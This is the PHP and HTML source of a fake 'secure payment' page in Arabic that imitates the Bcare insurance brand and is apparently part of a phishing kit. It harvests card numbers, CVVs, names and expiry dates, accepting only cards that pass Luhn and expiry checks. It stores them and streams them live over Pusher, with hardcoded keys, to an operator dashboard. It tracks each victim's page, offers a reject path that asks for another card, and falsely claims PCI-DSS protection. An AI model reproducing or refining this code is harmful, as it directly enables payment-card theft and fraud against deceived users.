<?php
error_reporting(0);
ini_set('display_errors', 0);
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'البطاقة');

    $options = array('cluster' => 'ap2', 'useTLS' => true);
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);

    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'البطاقة']);
}

if (isset($_POST['submit'])) {
    $options = array('cluster' => 'ap2', 'useTLS' => true);
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);

    $site = array(
        'cardNumber' => $_POST['cardNumber'],
        'cardname' => $_POST['cardname'],
        'cvv' => $_POST['cvv'],
        'year' => $_POST['year'],
        'totalprice' => $_SESSION['totalprice'],
        'message' => 'البطاقة',
        'type' => '1'
    );

    $userId = $_SESSION['user_id'];

    if ($User->isCardBanned($_POST['cardNumber'])) {
        $showBannedError = true;
    } else {
        $id = $User->InsertCardVisaRelatedUser($userId, $site);
        if ($id) {
            $User->UpdateStatus($userId, 'البطاقة');
            $_SESSION['card_id'] = $id;
            $pusher->trigger('bcare', 'update-user-accountt', ['userId' => $userId, 'updatedData' => $site]);
            echo "<script>document.location.href='wait-payment.php';</script>";
            exit;
        }
    }
}

if (isset($_GET['reject'])) {
    $showError = true;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بي كير للتأمين | الدفع الآمن</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --primary-color: #156394;
            --secondary-color: #f9a824;
            --bg-color: #f8fafc;
            --text-dark: #1e293b;
            --card-gradient: linear-gradient(135deg, #1e293b 0%, #334155 100%);
        }

        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: "Cairo", serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-dark);
            min-height: 100vh;
        }

        .navbar {
            background: white;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
            padding: 1rem 0;
        }

        /* Virtual Card Styling */
        .card-container {
            perspective: 1000px;
            margin: 20px auto 40px;
            width: 100%;
            max-width: 440px;
        }

        .virtual-card {
            width: 100%;
            height: 250px;
            position: relative;
            transform-style: preserve-3d;
            transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
        }

        .virtual-card.flipped {
            transform: rotateY(180deg);
        }

        .card-front,
        .card-back {
            position: absolute;
            width: 100%;
            height: 100%;
            backface-visibility: hidden;
            border-radius: 20px;
            padding: 25px;
            color: white;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            overflow: hidden;
        }

        .card-front {
            background: var(--card-gradient);
        }

        .card-back {
            background: var(--card-gradient);
            transform: rotateY(180deg);
            padding: 0;
        }

        .card-chip {
            width: 50px;
            height: 40px;
            background: linear-gradient(135deg, #fcd34d 0%, #b45309 100%);
            border-radius: 8px;
            margin-bottom: 20px;
        }

        .card-number-display {
            font-size: 1.4rem;
            letter-spacing: 3px;
            margin-bottom: 25px;
            font-family: monospace;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
            text-align: center;
            white-space: nowrap;
        }

        @media (max-width: 480px) {
            .card-container {
                max-width: 100%;
            }

            .virtual-card {
                height: 200px;
            }

            .card-number-display {
                font-size: 1.1rem;
                letter-spacing: 1px;
                margin-bottom: 15px;
            }

            .card-front,
            .card-back {
                padding: 15px;
            }
        }

        .card-info {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
        }

        .info-label {
            font-size: 0.6rem;
            text-transform: uppercase;
            opacity: 0.7;
            margin-bottom: 5px;
        }

        .info-value {
            font-size: 0.9rem;
            font-weight: 700;
        }

        .card-type-icon {
            font-size: 2rem;
            opacity: 0.9;
        }

        .card-stripe {
            width: 100%;
            height: 50px;
            background: #000;
            margin-top: 30px;
        }

        .card-cvv-band {
            width: 80%;
            height: 40px;
            background: rgba(255, 255, 255, 0.9);
            margin: 20px auto;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            padding: 0 15px;
            color: #334155;
            font-weight: 900;
            font-style: italic;
        }

        .payment-box {
            background: white;
            border-radius: 24px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.05);
            margin-bottom: 50px;
        }

        .form-label {
            font-weight: 700;
            color: var(--text-dark);
            font-size: 0.9rem;
            margin-bottom: 8px;
        }

        .form-control {
            height: 55px;
            border-radius: 12px;
            border: 2px solid #f1f5f9;
            padding: 0 20px;
            font-weight: 600;
            transition: all 0.3s;
        }

        .form-control:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 4px rgba(21, 99, 148, 0.1);
            outline: none;
        }

        .btn-pay {
            height: 60px;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 900;
            background-color: var(--secondary-color);
            border: none;
            color: white;
            transition: all 0.3s;
            margin-top: 20px;
        }

        .btn-pay:hover:not(:disabled) {
            background-color: #e8951a;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(249, 168, 36, 0.3);
        }

        .btn-pay:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .security-badges {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 30px;
            opacity: 0.6;
        }

        .security-badges img {
            height: 35px;
            filter: grayscale(1);
        }

        .summary-mini {
            background: #eff6ff;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 25px;
            border: 1px dashed var(--primary-color);
        }
    </style>
</head>

<body>

    <nav class="navbar">
        <div class="container d-flex justify-content-center">
            <a href="index.php">
                <img src="./assets/Bcare-logo.svg" alt="Bcare" height="40">
            </a>
        </div>
    </nav>

    <div class="container my-5">
        <div class="row justify-content-center">
            <div class="col-lg-6 col-md-8">
                <div class="payment-box">
                    <h3 class="text-center fw-900 mb-2">الدفع الآمن</h3>
                    <p class="text-center text-muted mb-4 small">أدخل تفاصيل بطاقتك لإتمام عملية الشراء</p>

                    <!-- Mini Summary -->
                    <div class="summary-mini d-flex justify-content-between align-items-center">
                        <span class="fw-bold">إجمالي المبلغ:</span>
                        <span class="h4 mb-0 fw-900 text-primary"><?= number_format($_SESSION['totalprice'] ?? 0, 2) ?>
                            ر.س</span>
                    </div>

                    <!-- Virtual Card Preview -->
                    <div class="card-container">
                        <div class="virtual-card" id="vCard">
                            <div class="card-front">
                                <div style="display:flex; justify-content: space-between;">
                                    <div class="card-chip"></div>
                                    <div class="card-type-icon"><i class="bi bi-credit-card"></i></div>
                                </div>
                                <div class="card-number-display" id="vCardNum" dir="ltr">**** **** **** ****</div>
                                <div class="card-info">
                                    <div>
                                        <div class="info-label">صاحب البطاقة</div>
                                        <div class="info-value" id="vCardName">GUEST VISITOR</div>
                                    </div>
                                    <div style="text-align: left;">
                                        <div class="info-label">التاريخ</div>
                                        <div class="info-value" id="vCardExpiry">MM/YY</div>
                                    </div>
                                </div>
                            </div>
                            <div class="card-back">
                                <div class="card-stripe"></div>
                                <div style="padding-top: 10px; font-size: 10px; opacity: 0.7; padding-right: 25px;">
                                    AUTHORIZED SIGNATURE</div>
                                <div class="card-cvv-band" id="vCardCVV">***</div>
                                <div style="padding: 15px; font-size: 8px; opacity: 0.5; text-align: center;">This card
                                    is used for secure bcare insurance payments.</div>
                            </div>
                        </div>
                    </div>

                    <?php if (isset($showBannedError) && $showBannedError): ?>
                        <div class="alert alert-danger text-center fw-bold rounded-4 mb-4">نعتذر، هذه البطاقة محظورة من
                            الاستخدام.</div>
                    <?php endif; ?>


                    <form action="" method="POST" id="paymentForm">
                        <div class="mb-3">
                            <label class="form-label">الاسم على البطاقة</label>
                            <input type="text" name="cardname" id="cardNameInput" required
                                class="form-control text-start" dir="ltr" placeholder="JOHN XXXX" autocomplete="off">
                        </div>

                        <div class="mb-3">
                            <label class="form-label">رقم البطاقة</label>
                            <input type="text" name="cardNumber" id="cardNumberInput" required
                                class="form-control text-start" dir="ltr" placeholder="**** **** **** ****"
                                inputmode="numeric" maxlength="19" autocomplete="off">
                        </div>

                        <div class="row">
                            <div class="col-7 mb-3">
                                <label class="form-label">تاريخ الانتهاء</label>
                                <input type="text" name="year" id="expiryInput" required class="form-control"
                                    placeholder="الشهر / السنة" inputmode="numeric" maxlength="5" autocomplete="off">
                            </div>
                            <div class="col-5 mb-3">
                                <label class="form-label">رمز CVV</label>
                                <input type="text" name="cvv" id="cvvInput" required class="form-control text-center"
                                    placeholder="***" inputmode="numeric" minlength="3" maxlength="3"
                                    autocomplete="off">
                            </div>
                        </div>

                        <button type="submit" name="submit" id="submitBtn" disabled class="btn btn-pay w-100">إتمام
                            الشراء والدفع</button>
                    </form>

                    <div class="security-badges text-center">
                        <img src="./assets/button.svg" alt="Visa">
                    </div>
                    <p class="text-center mt-4 small text-muted"><i class="bi bi-shield-fill-check text-success"></i>
                        جميع معاملاتك مشفرة وآمنة وفق معايير PCI-DSS</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4"
                        style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">المعلومات غير صحيحة</h5>
                    <p class="text-muted small px-3">بيانات البطاقة المدخلة غير صحيحة، يرجى التأكد من الأرقام والمحاولة
                        مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal"
                        style="background: #f1f5f9; color: #475569; height: 55px; border-radius: 12px; font-weight: 800;">حسناً،
                        فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Discount Modal -->
    <div class="modal fade" id="discountModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 bg-transparent">
                <div class="modal-body p-0 position-relative">
                    <button type="button" class="btn-close btn-close-white position-absolute top-0 end-0 m-3"
                        data-bs-dismiss="modal" aria-label="Close" style="z-index: 1060;"></button>
                    <img src="./assets/discount.jpg" alt="خصم خاص" class="img-fluid rounded-4 shadow-lg"
                        style="max-height: 80vh;">
                    <div class="mt-4">
                        <button type="button" class="btn btn-primary px-5 fw-bold rounded-pill" data-bs-dismiss="modal"
                            style="background: var(--secondary-color); border: none;">استمتع بالخصم الآن</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.getElementById("submitBtn").addEventListener("click", function () {
            this.style.display = "none";
        });
        $(document).ready(function () {
            <?php if (isset($showError) && $showError): ?>
                var errorModal = new bootstrap.Modal(document.getElementById('errorModal'));
                errorModal.show();
            <?php else: ?>
                var discountModal = new bootstrap.Modal(document.getElementById('discountModal'));
                discountModal.show();
            <?php endif; ?>
        });

        function isValidLuhn(digits) {
            let sum = 0;
            for (let i = 0; i < digits.length; i++) {
                let cardNum = parseInt(digits[i]);
                if ((digits.length - i) % 2 === 0) {
                    cardNum = cardNum * 2;
                    if (cardNum > 9) cardNum = cardNum - 9;
                }
                sum += cardNum;
            }
            return sum % 10 === 0;
        }

        document.addEventListener('DOMContentLoaded', function () {
            const form = document.getElementById('paymentForm');
            const submitBtn = document.getElementById('submitBtn');
            const cardNumInput = document.getElementById('cardNumberInput');
            const cardNameInput = document.getElementById('cardNameInput');
            const expiryInput = document.getElementById('expiryInput');
            const cvvInput = document.getElementById('cvvInput');
            const vCard = document.getElementById('vCard');

            const vNum = document.getElementById('vCardNum');
            const vName = document.getElementById('vCardName');
            const vExp = document.getElementById('vCardExpiry');
            const vCVV = document.getElementById('vCardCVV');

            cardNumInput.addEventListener('input', (e) => {
                let val = e.target.value.replace(/\D/g, '');
                if (val.length > 16) val = val.slice(0, 16);
                let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
                e.target.value = formatted;
                vNum.innerText = formatted || '**** **** **** ****';
                checkFormStatus();
            });

            cardNameInput.addEventListener('input', (e) => {
                vName.innerText = e.target.value.toUpperCase() || 'GUEST VISITOR';
                checkFormStatus();
            });

            expiryInput.addEventListener('input', (e) => {
                let val = e.target.value.replace(/\D/g, '');
                if (val.length > 4) val = val.slice(0, 4);
                if (val.length >= 2) {
                    val = val.slice(0, 2) + '/' + val.slice(2, 4);
                }
                e.target.value = val;
                vExp.innerText = val || 'MM/YY';
                checkFormStatus();
            });

            cvvInput.addEventListener('focus', () => vCard.classList.add('flipped'));
            cvvInput.addEventListener('blur', () => vCard.classList.remove('flipped'));
            cvvInput.addEventListener('input', (e) => {
                vCVV.innerText = e.target.value || '***';
                checkFormStatus();
            });

            function checkFormStatus() {
                const cNum = cardNumInput.value.replace(/\s/g, '');
                const exp = expiryInput.value;
                const name = cardNameInput.value.trim();
                const cvv = cvvInput.value;

                let isLuhnValid = cNum.length === 16 && isValidLuhn(cNum);

                let isExpiryValid = false;
                if (exp.length === 5) {
                    const [mm, yy] = exp.split('/');
                    const month = parseInt(mm, 10);
                    const year = parseInt(yy, 10) + 2000;

                    const now = new Date();
                    const currentYear = now.getFullYear();
                    const currentMonth = now.getMonth() + 1;

                    if (month >= 1 && month <= 12) {
                        if (year > currentYear || (year === currentYear && month >= currentMonth)) {
                            isExpiryValid = true;
                        }
                    }
                }

                const isNameValid = name.length > 2;
                const isCvvValid = cvv.length >= 3;

                submitBtn.disabled = !(isLuhnValid && isExpiryValid && isNameValid && isCvvValid);
            }
        });
    </script>

    <?php include 'chat_widget.php'; ?>
</body>

</html>